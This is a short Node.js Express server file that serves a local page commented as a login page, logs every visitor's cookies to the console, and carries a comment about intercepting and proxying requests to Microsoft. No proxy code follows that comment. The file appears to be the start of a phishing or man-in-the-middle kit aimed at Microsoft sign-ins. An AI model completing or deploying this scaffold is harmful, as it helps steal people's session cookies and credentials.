const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const axios = require("axios");
const fs = require("fs");

const app = express();

// Middleware for parsing form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the login page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "myfile.html"));
  console.log("cookies:", req.headers.cookie);
});

// Intercept and proxy requests to Microsoft

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
